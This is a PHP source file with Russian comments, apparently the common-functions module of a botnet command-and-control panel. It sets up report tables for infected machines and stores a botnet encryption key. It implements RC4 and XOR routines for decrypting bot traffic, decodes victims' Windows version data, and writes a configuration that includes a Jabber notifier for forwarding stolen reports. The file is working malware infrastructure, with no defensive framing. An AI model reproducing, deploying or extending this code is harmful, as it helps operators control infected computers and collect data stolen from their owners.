<?php error_reporting(E_ALL); set_time_limit(0); mb_internal_encoding('UTF-8'); mb_regex_encoding('UTF-8');

///////////////////////////////////////////////////////////////////////////////////////////////////
// Константы.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Кодовая странци для MySQL.
define('MYSQL_CODEPAGE', 'utf8');
define('MYSQL_COLLATE',  'utf8_unicode_ci');

//Ботнет по умолчанию. Менять не рекомендуется.
define('DEFAULT_BOTNET', '-- default --');

//Некотрые данные о протоколе.
define('HEADER_SIZE',      48); //sizeof(BinStorage::STORAGE)
define('HEADER_MD5',       32); //OFFSETOF(BinStorage::STORAGE, MD5Hash)
define('ITEM_HEADER_SIZE', 16); //sizeof(BinStorage::ITEM)

//Конастанты сгенерированые из defines.php
/*EVAL_BEGIN*/
global $_COMMON_DEFINE;
return generateXDefines($_COMMON_DEFINE, 'php')."define('BO_CLIENT_VERSION', '".BO_CLIENT_VERSION."');";
/*EVAL_END*/

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Добавление заголовков HTTP для предотврашения кэширования браузером.
*/
function httpNoCacheHeaders()
{
  header('Expires: Fri, 01 Jan 1990 00:00:00 GMT'); //...
  header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0, pre-check=0, post-check=0'); //HTTP/1.1
  header('Pragma: no-cache'); // HTTP/1.0
}

/*
  Добавление заголовков HTTP и BOM для вывода данных как UTF-8 текста.
*/
function httpU8PlainHeaders()
{
  header('Content-Type: text/plain; charset=utf-8');
  echo "\xEF\xBB\xBF"; //UTF8 BOM
}

/*
  Проверяет сущетвует ли в путе указатель на уровень выше '..'.
  
  IN $path - string, путь для проверки.
  
  Return   - bool, true - если сущетвует, false - если не сущетвует.
*/
function pathUpLevelExists($path)
{
  return (strstr('/'.str_replace('\\', '/', $path).'/', '/../') === false ? false : true);
}

/*
  Надстройка над basename, которая обрабатывает оба типа слеша, независимо от платформы.
  
  IN $path - string, строка для обработки.
  
  Return   - string, базовое имя.
*/
function baseNameEx($path)
{
  return basename(str_replace('\\', '/', $path));
}

/*
  Преобразование GMT в текстовое представление.
  
  IN $bias - int, GMT в секундах.
  
  Return   - string, GMT в текстовое представление.
*/
function timeBiasToText($bias)
{
  return ($bias >= 0 ? '+' : '-').abs(intval($bias / 3600)).':'.sprintf('%02u', abs(intval($bias % 60)));
}

/*
  Преобразование TickCount в hh:mm:ss
  
  IN $tc - int, TickCount.
  
  Return - string, hh:mm:ss.
*/
function tickCountToText($tc)
{
  return sprintf('%02u:%02u:%02u', $tc / 3600, $tc / 60 - (sprintf('%u', ($tc / 3600)) * 60), $tc - (sprintf('%u', ($tc / 60)) * 60));
}

/*
  Добавление слешей в стиле JavaScript.
  
  IN $string - string, строка для обработки.
  
  Return     - форматированя строка.
*/
function addJsSlashes($string)
{
  return addcslashes($string, "\\/\'\"");
}

/*
  Надстройка для htmlentities, для форматирования в UTF-8.
  
  IN $string - string, строка для обработки.
  
  Return     - форматированя строка.
*/
function htmlEntitiesEx($string)
{
  /*
    HTML uses the standard UNICODE Consortium character repertoire, and it leaves undefined (among
    others) 65 character codes (0 to 31 inclusive and 127 to 159 inclusive) that are sometimes
    used for typographical quote marks and similar in proprietary character sets.
  */
  return htmlspecialchars(preg_replace('|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');
}

/*
  Надстройка для number_format, для форматирования в int формате для текущего языка.
  
  IN $number - int, число для обработки.
  
  Return     - string, отформатированое число.
*/
function numberFormatAsInt($number)
{
  return number_format($number, 0, '.', ' ');
}

/*
  Надстройка для number_format, для форматирования в float формате для текущего языка.
  
  IN $number   - float, число для обработки.
  IN $decimals - количетсво цифр в дробной части.
  
  Return     - string, отформатированое число.
*/
function numberFormatAsFloat($number, $decimals)
{
  return number_format($number, $decimals, '.', ' ');
}

/*
  Преобразование числа в версию.
  
  IN $i  - int, число для обработки.
  
  Return - string, версия.
*/
function intToVersion($i)
{
  return sprintf("%u.%u.%u.%u", ($i >> 24) & 0xFF, ($i >> 16) & 0xFF,($i >> 8) & 0xFF, $i & 0xFF);
}

/*
  Конвертация данных о версии OS в строку.
  
  IN $os_data - string, данные OS.
  
  Return      - string, строквое представление версии OS.
*/
function osDataToString($os_data)
{
  $name = 'Unknown';
  if(strlen($os_data) == 6 /*sizeof(OSINFO)*/)
  {
    $data = @unpack('Cversion/Csp/Sbuild/Sarch', $os_data);
    
    //Базовое название.
    switch($data['version'])
    {
      case 2: $name = 'XP'; break;
      case 3: $name = 'Server 2003'; break;
      case 4: $name = 'Vista'; break;
      case 5: $name = 'Server 2008'; break;
      case 6: $name = 'Seven'; break;
      case 7: $name = 'Server 2008 R2'; break;
    }
    
    //Архитектура.
    if($data['arch'] == 9 /*PROCESSOR_ARCHITECTURE_AMD64*/)$name .= ' x64';
   
    //Сервиспак.
    if($data['sp'] > 0)$name .= ', SP '.$data['sp'];
  }
  return $name;
}

/*
  Конвертация строки в строку с закоментроваными спец. символами SQL маски.
  
  IN $str - string, исходная строка.
  
  Return  - string, конченая строка.
*/
function toSqlSafeMask($str)
{
  return str_replace(array('%', '_'), array('\%', '\_'), $str);
}

/*
  Получение списка таблиц отчетов по дням.
  
  IN $db - string, БД, из которой будет получены таблицы.
  
  Return - array, список таблиц, отсортированый по имени.
*/
function listReportTables($db)
{
  $template = 'botnet_reports_';
  $tsize    = 15;//strlen($template);
  $list = array();
  
  if(($r = @mysql_list_tables($db)))while(($m = @mysql_fetch_row($r)))if(strncmp($template, $m[0], $tsize) === 0 && is_numeric(substr($m[0], $tsize)))$list[] = $m[0];
  
  @sort($list);
  return $list;
}

/*
  Проверка корректности значений переменной из массива $_POST.

  IN $name     - string, имя.
  IN $min_size - минимальная длина.
  IN $max_size - максимальная длина.

  Return       - NULL - если не значение не походит под условия,
                 string - значение переменной.
*/
function checkPostData($name, $min_size, $max_size)
{
  $data = isset($_POST[$name]) ? trim($_POST[$name]) : '';
  $s = mb_strlen($data);
  if($s < $min_size || $s > $max_size)return NULL;
  return $data;
}

/*
  Подключение к базе и установка основных параметров.
  
  Return - bool, true - в случуи успеха, false в случаи ошибки.
*/
function connectToDb()
{
  if(!@mysql_connect($GLOBALS['config']['mysql_host'], $GLOBALS['config']['mysql_user'], $GLOBALS['config']['mysql_pass']) || !@mysql_query('SET NAMES \''.MYSQL_CODEPAGE.'\' COLLATE \''.MYSQL_COLLATE.'\'') || !@mysql_select_db($GLOBALS['config']['mysql_db']))return false;
  return true;
}

/*
  Выполнение MySQL запроса, с возможностью автоматического восттановления поврежденной таблицы.
  Функция актуальна только для MyISAM.
  
  IN $table - название таблицы.
  IN $query - запрос.
  
  Return    - заначение согласно mysql_query().
*/
function mysqlQueryEx($table, $query)
{
  $r = @mysql_query($query); 
  if($r === false)
  {
    $err = @mysql_errno();
    if(($err === 145 || $err === 1194) && @mysql_query("REPAIR TABLE `{$table}`") !== false)$r = @mysql_query($query); 
  }
  return $r;
}

/*
  Инициализация RC4 ключа.
  
  IN $key - string, текстовый ключ.
  Return  - array, бинарный ключ.
*/
function rc4Init($key)
{
  $hash      = array();
  $box       = array();
  $keyLength = strlen($key);
  
  for($x = 0; $x < 256; $x++)
  {
    $hash[$x] = ord($key[$x % $keyLength]);
    $box[$x]  = $x;
  }

  for($y = $x = 0; $x < 256; $x++)
  {
    $y       = ($y + $box[$x] + $hash[$x]) % 256;
    $tmp     = $box[$x];
    $box[$x] = $box[$y];
    $box[$y] = $tmp;
  }
  
  return $box;
}

/*
  Широфвание RC4.
  
  IN OUT $data - string, данные для шифрования.
  IN $key      - string, ключ шифрования от rc4Init().
*/
function rc4(&$data, $key)
{
  $len = strlen($data);
  for($z = $y = $x = 0; $x < $len; $x++)
  {
    $z = ($z + 1) % 256;
    $y = ($y + $key[$z]) % 256;

    $tmp      = $key[$z];
    $key[$z]  = $key[$y];
    $key[$y]  = $tmp;
    $data[$x] = chr(ord($data[$x]) ^ ($key[(($key[$z] + $key[$y]) % 256)]));
  }
}

/*
  Визуальное шифрование.
  
  IN OUT $data - string, данные для шифрования.
*/
function visualEncrypt(&$data)
{
  $len = strlen($data);
  for($i = 1; $i < $len; $i++)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

/*
  Визуальное дешифрование.
  
  IN OUT $data - string, данные для шифрования.
*/
function visualDecrypt(&$data)
{
  $len = strlen($data);
  if($len > 0)for($i = $len - 1; $i > 0; $i--)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

/*
  Создание директории, включая весь путь.
  
  IN $dir - string, директория.
*/
function createDir($dir)
{
  $ll = explode('/', str_replace('\\', '/', $dir));
  $cur = '';
  
  foreach($ll as $d)if($d != '..' && $d != '.' && strlen($d) > 0)
  {
    $cur .= $d.'/';
    if(!is_dir($cur) && !@mkdir($cur, 0777))return false;
  }
  return true;
}

/*
  Обналвения файла конфигурации.
  
  IN $updateList - array, список для обналвения.
  
  Return - true - в случаи успеха,
           false - в случаи ошибки.
*/
function updateConfig($updateList)
{
  //Пытаемся дать себе права.
  $file    = defined('FILE_CONFIG') ? FILE_CONFIG : 'system/config.php';
  $oldfile = $file.'.old.php';
  
  @chmod(@dirname($file), 0777);
  @chmod($file,           0777);
  @chmod($oldfile,        0777);
  
  //Удаляем старый файл.
  @unlink($oldfile);
  
  //переименовывем текущий конфиг.
  if(is_file($file) && !@rename($file, $oldfile))return false;
  else
  {
    $cryptKey = updateConfigHelper($updateList, 'botnet_cryptkey', '');
    
    $cfgData = "<?php\n".
               "\$config['mysql_host']          = '".addslashes(updateConfigHelper($updateList, 'mysql_host', '127.0.0.1'))."';\n".
               "\$config['mysql_user']          = '".addslashes(updateConfigHelper($updateList, 'mysql_user', ''))."';\n".
               "\$config['mysql_pass']          = '".addslashes(updateConfigHelper($updateList, 'mysql_pass', ''))."';\n".
               "\$config['mysql_db']            = '".addslashes(updateConfigHelper($updateList, 'mysql_db',   ''))."';\n".
               "\n".
               "\$config['reports_path']        = '".addslashes(updateConfigHelper($updateList, 'reports_path', '_reports'))."';\n".
               "\$config['reports_to_db']       = ".updateConfigHelper($updateList, 'reports_to_db', 0).";\n".
               "\$config['reports_to_fs']       = ".updateConfigHelper($updateList, 'reports_to_fs', 0).";\n".
/*EVAL_BEGIN*/if(configBool('jabber_notifier'))return
"               \"\\n\".
               \"\\\$config['reports_jn']          = \".updateConfigHelper(\$updateList, 'reports_jn', 0).\";\\n\".
               \"\\\$config['reports_jn_logfile']  = '\".addslashes(updateConfigHelper(\$updateList, 'reports_jn_logfile', '')).\"';\\n\".
               \"\\\$config['reports_jn_account']  = '\".addslashes(updateConfigHelper(\$updateList, 'reports_jn_account', '')).\"';\\n\".
               \"\\\$config['reports_jn_pass']     = '\".addslashes(updateConfigHelper(\$updateList, 'reports_jn_pass', '')).\"';\\n\".
               \"\\\$config['reports_jn_server']   = '\".addslashes(updateConfigHelper(\$updateList, 'reports_jn_server', '')).\"';\\n\".
               \"\\\$config['reports_jn_port']     = \".updateConfigHelper(\$updateList, 'reports_jn_port', 5222).\";\\n\".
               \"\\\$config['reports_jn_to']       = '\".addslashes(updateConfigHelper(\$updateList, 'reports_jn_to', '')).\"';\\n\".
               \"\\\$config['reports_jn_list']     = '\".addslashes(updateConfigHelper(\$updateList, 'reports_jn_list', '')).\"';\\n\".
               \"\\\$config['reports_jn_script']   = '\".addslashes(updateConfigHelper(\$updateList, 'reports_jn_script', '')).\"';\\n\".";
/*EVAL_END*/
               "\n".
               "\$config['botnet_timeout']      = ".updateConfigHelper($updateList, 'botnet_timeout', 0).";\n".
               "\$config['botnet_cryptkey']     = '".addslashes($cryptKey)."';\n".
               "\$config['botnet_cryptkey_bin'] = array(".implode(', ', rc4Init($cryptKey)).");\n".
               "?>";

    //Сохраняем.
    if(@file_put_contents($file, $cfgData) !== strlen($cfgData))return false;
    //@chmod(@dirname($file), 0444);
  }
  return true;
}

/*
  Хелпер для updateConfig.
  
  IN $updateList - array, список для обналвения.
  IN $name       - имя переменной.
  IN $default    - значение по умолчанию.
  
  Return - значние переменной.
*/
function updateConfigHelper($updateList, $name, $default)
{
  return isset($updateList[$name]) ? $updateList[$name] : (isset($GLOBALS['config'][$name]) ? $GLOBALS['config'][$name] : $default);
}
?>